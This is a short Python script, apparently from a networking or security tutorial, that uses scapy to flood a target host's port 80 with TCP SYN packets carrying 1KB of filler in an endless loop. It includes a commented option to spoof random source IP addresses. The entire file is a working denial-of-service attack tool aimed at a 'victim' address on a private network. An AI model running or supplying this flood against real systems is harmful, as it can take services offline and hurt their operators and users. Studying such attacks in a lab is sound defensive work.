from scapy.all import *


# target private IP address of the victim 
# you can get the address via ifconfig
target_ip = "192.168.100.2"
# the target port u want to flood
target_port = 80 # The target port is HTTP

#Forge the SYN packet -> IP layer
# forge IP packet with target ip as the destination IP address
ip = IP(dst=target_ip)

# or if you want to perform IP Spoofing (will work as well)
# ip = IP(src=RandIP("192.168.1.1/24"), dst=target_ip)

# forge a TCP SYN packet with a random source port
# and the target port as the destination port
# the s port is in a range between 1 and 65535
# flag s = SYN packet
tcp = TCP(sport=RandShort(), dport=target_port, flags="S")

# add some flooding data (1KB in this case)
raw = Raw(b"X"*1024)

# stack up the layers
p = ip / tcp / raw
# send the constructed packet in a loop until CTRL+C is detected 
# the function send sends packets at layer 3 -> network layer
# Viene assegnato un indirizzo IP univoco
# setting verbose to 0 will not print anything during the process
send(p, loop=1, verbose=0)